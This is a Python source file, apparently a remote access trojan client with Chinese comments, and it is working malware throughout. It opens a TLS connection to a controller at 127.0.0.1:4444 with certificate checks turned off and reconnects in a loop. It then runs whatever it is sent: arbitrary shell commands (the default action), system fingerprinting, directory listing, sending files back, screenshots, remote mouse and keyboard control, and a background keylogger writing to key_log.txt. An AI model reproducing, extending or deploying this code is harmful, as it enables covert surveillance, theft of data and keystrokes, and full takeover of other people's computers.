import socket
import ssl
import subprocess
import platform
import os
import struct
import time
import sys
import io

# 尝试导入可选的图形/键鼠库，若不存在则标记为 None 以防崩溃
try:
    import pyautogui
    pyautogui.FAILSAFE = False
except ImportError:
    pyautogui = None

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

try:
    from pynput import keyboard
except ImportError:
    keyboard = None

def send_packet(sock, msg_bytes):
    sock.sendall(struct.pack('!I', len(msg_bytes)) + msg_bytes)

def module_sysinfo():
    try:
        info = f"[-] OS: {platform.system()} {platform.release()}\n[-] Node: {platform.node()}\n[-] Machine: {platform.machine()}\n[-] User: {os.getlogin() if hasattr(os, 'getlogin') else 'N/A'}"
        return info.encode('utf-8')
    except Exception as e:
        return f"[-] Error: {str(e)}".encode('utf-8')

def module_shell(arg):
    try:
        proc = subprocess.Popen(arg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = proc.communicate()
        res = out + err
        return res if res else b"[+] Command completed (no output)\n"
    except Exception as e:
        return f"[-] Shell Error: {str(e)}".encode('utf-8')

def module_file_list(path):
    try:
        if not path:
            path = "."
        files = os.listdir(path)
        return "\n".join(files).encode('utf-8')
    except Exception as e:
        return f"[-] List Error: {str(e)}".encode('utf-8')

def module_download(path):
    if os.path.exists(path):
        try:
            with open(path, 'rb') as f:
                return f.read()
        except Exception as e:
            return f"[-] Read Error: {str(e)}".encode('utf-8')
    else:
        return b"[-] Error: File not found."

def module_screenshot_compressed():
    if not ImageGrab:
        return b"[-] Error: ImageGrab (PIL) library not available or not supported on this platform."
    try:
        screenshot = ImageGrab.grab()
        screenshot.thumbnail((1024, 768))
        buffer = io.BytesIO()
        screenshot.save(buffer, format="JPEG", quality=60)
        return buffer.getvalue()
    except Exception as e:
        return f"[-] Compress Screenshot Error: {str(e)}".encode('utf-8')

def module_mouse(action, x, y, button='left'):
    if not pyautogui:
        return b"[-] Error: pyautogui library not available."
    try:
        x, y = int(x), int(y)
        if action == 'move':
            pyautogui.moveTo(x, y)
        elif action == 'click':
            pyautogui.click(x, y, button=button)
        elif action == 'double':
            pyautogui.doubleClick(x, y, button=button)
        elif action == 'down':
            pyautogui.mouseDown(x, y, button=button)
        elif action == 'up':
            pyautogui.mouseUp(x, y, button=button)
        return f"[+] Mouse {action} executed at ({x}, {y}).".encode('utf-8')
    except Exception as e:
        return f"[-] Mouse Error: {str(e)}".encode('utf-8')

def module_keyboard(action, content):
    if not pyautogui:
        return b"[-] Error: pyautogui library not available."
    try:
        if action == 'type':
            pyautogui.write(content, interval=0.02)
        elif action == 'press':
            pyautogui.press(content)
        elif action == 'hotkey':
            keys = content.split('+')
            pyautogui.hotkey(*keys)
        return f"[+] Keyboard {action} executed.".encode('utf-8')
    except Exception as e:
        return f"[-] Keyboard Error: {str(e)}".encode('utf-8')

def start_keylogger():
    if not keyboard:
        return b"[-] Error: pynput library not available."
    try:
        def on_press(key):
            try:
                with open("key_log.txt", "a", encoding="utf-8") as f:
                    f.write(f"{key.char}")
            except AttributeError:
                with open("key_log.txt", "a", encoding="utf-8") as f:
                    f.write(f"[{key}]")
        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        return b"[+] Keylogger started in background."
    except Exception as e:
        return f"[-] Keylogger Error: {str(e)}".encode('utf-8')

def run_secure_agent():
    target_ip = "127.0.0.1"
    target_port = 4444

    while True:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s = context.wrap_socket(raw_socket, server_hostname=target_ip)
            s.connect((target_ip, target_port))

            while True:
                cmd_bytes = s.recv(4096)
                if not cmd_bytes:
                    break
                command = cmd_bytes.decode('utf-8', errors='ignore').strip()
                
                if command.lower() == 'exit':
                    break

                parts = command.split(' ', 3)
                action = parts[0].lower()
                
                response = b""
                if action == 'sysinfo':
                    response = module_sysinfo()
                elif action == 'shell':
                    response = module_shell(parts[1] if len(parts) > 1 else "")
                elif action == 'ls':
                    response = module_file_list(parts[1] if len(parts) > 1 else ".")
                elif action == 'download':
                    response = module_download(parts[1] if len(parts) > 1 else "")
                elif action == 'screenshot':
                    response = module_screenshot_compressed()
                elif action == 'mouse':
                    sub_act = parts[1] if len(parts) > 1 else 'click'
                    x = parts[2] if len(parts) > 2 else 0
                    y = parts[3] if len(parts) > 3 else 0
                    response = module_mouse(sub_act, x, y)
                elif action == 'keyboard':
                    sub_act = parts[1] if len(parts) > 1 else 'press'
                    content = parts[2] if len(parts) > 2 else ''
                    response = module_keyboard(sub_act, content)
                elif action == 'keylogger':
                    response = start_keylogger()
                else:
                    response = module_shell(command)

                send_packet(s, response)
        except Exception:
            time.sleep(5)
            continue

if __name__ == '__main__':
    run_secure_agent()
